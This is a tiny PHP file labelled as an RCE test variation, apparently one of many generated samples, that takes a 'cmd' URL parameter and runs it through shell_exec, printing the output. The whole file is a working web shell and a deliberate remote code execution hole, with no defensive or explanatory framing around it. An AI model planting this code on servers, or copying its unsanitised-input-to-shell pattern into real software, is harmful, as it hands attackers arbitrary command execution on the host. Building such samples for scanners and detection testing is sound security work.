<?php
// RCE test variation #614
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>